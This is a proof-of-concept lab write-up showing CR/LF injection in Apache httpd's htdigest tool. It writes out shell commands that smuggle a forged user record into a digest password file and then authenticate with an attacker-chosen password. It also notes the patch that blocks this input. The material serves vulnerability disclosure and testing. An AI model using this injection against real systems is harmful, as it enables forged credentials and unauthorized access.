# PoC 136 - htdigest writes attacker-controlled CR/LF into digest file

`htdigest` accepts username and realm arguments containing CR, LF, or `:`,
and writes them verbatim into the password file. Embedded newlines append
attacker-controlled physical records that Apache later parses as valid
credentials.

## Setup

Build the support tools that ship with httpd 2.4.66:

```
cd support
make htdigest
```

We will create a digest file with one normal record, then have the attacker
feed a username argument that smuggles a second physical line.

The lab's victim deployment:

`conf/httpd.conf`:

```
ServerName localhost
Listen 127.0.0.1:8080
LoadModule mpm_prefork_module    modules/mod_mpm_prefork.so
LoadModule authn_core_module     modules/mod_authn_core.so
LoadModule authn_file_module     modules/mod_authn_file.so
LoadModule auth_digest_module    modules/mod_auth_digest.so
LoadModule authz_user_module     modules/mod_authz_user.so
LoadModule authz_core_module     modules/mod_authz_core.so
LoadModule unixd_module          modules/mod_unixd.so
LoadModule log_config_module     modules/mod_log_config.so

ErrorLog logs/error_log
DocumentRoot "/tmp/htdocs"
<Directory "/tmp/htdocs">
    AuthType Digest
    AuthName "staff"
    AuthDigestProvider file
    AuthUserFile /tmp/digest.passwd
    Require valid-user
</Directory>
```

## Trigger

Compute the HA1 the attacker wants the smuggled record to carry:

```
ATTACKER_PASS=hunter2
HA1=$(printf 'victim:staff:%s' "$ATTACKER_PASS" | md5sum | awk '{print $1}')
echo "HA1=$HA1"
```

Provoke the injection by passing a username argument with an embedded LF
plus a fully formed `victim:staff:HA1` record:

```
PAYLOAD="attacker
victim:staff:${HA1}"

# Drive htdigest non-interactively by piping the passphrase twice
printf 'placeholder\nplaceholder\n' | \
    ./support/htdigest -c /tmp/digest.passwd staff "$PAYLOAD"
```

`/tmp/digest.passwd` now contains:

```
attacker
victim:staff:1c6e5f...:placeholder-hash-from-htdigest-line
```

Note the second line is a syntactically complete `user:realm:HA1` record;
the trailing colon plus htdigest-emitted hash is ignored by the parser
because only the first three colon-separated fields are consumed.

## Observed effect

Authenticate against the smuggled record:

```
curl --digest -u "victim:hunter2" -v http://127.0.0.1:8080/
```

The server returns `200 OK`. `mod_auth_digest` parsed the second physical
line, lifted `1c6e5f...` as the stored HA1 for `victim` in realm `staff`,
and verified the attacker-chosen password `hunter2`.

Removing the comma/CR/LF check from `htdigest` is sufficient to reproduce
this. With the patch, `htdigest` exits with
`Username and realm may not contain ':' or newline characters.` before any
file write occurs.
